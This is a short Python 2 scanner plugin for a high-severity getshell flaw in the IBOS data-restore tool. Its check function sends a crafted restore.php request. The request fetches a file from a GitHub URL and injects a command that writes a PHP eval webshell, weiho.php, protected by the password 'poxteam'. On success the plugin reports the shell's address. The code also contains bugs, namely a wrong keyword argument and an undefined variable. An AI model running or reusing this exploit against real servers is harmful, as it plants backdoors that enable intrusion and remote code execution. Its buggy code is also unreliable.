# coding:utf-8

import requests

def get_plugin_info():
    plugin_info = {
        "name": "IBOS数据恢复工具Getshell漏洞",
        "info": "IBOS数据恢复工具Getshell",
        "level": "高危",
        "type": "getshell",
        "author": "taro",
        "url": "",
        "keyword": "IBOS",
        "source": 1
    }
    return plugin_info

def check(host, port, timeout):
    url = "http://%s:%d/" % (host, int(port)) + r'/data/restore.php?op=restore&id=https://raw.githubusercontent.com/zhaoweiho/IBOS-remote-download-getshell/master/poxteam.txt%20?%20%26%20echo%20^%3C?php%20@eval($_GET[%22poxteam%22])?^%20>%20weiho.php"]'
    header_list = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',
    }
    try:
        res = requests.get(url, header=header_list ,timeout=timeout)
        res.encoding = 'utf-8'
        resp_text = res.text
        if request.status_code == 200 and u'数据已成功导入数据库' in resp_text:
            info = 'webshell地址(PassWord:poxteam): http://%s:%d//data/weiho.php.'  % (host,int(port))
            return info
    except Exception, e:
        pass
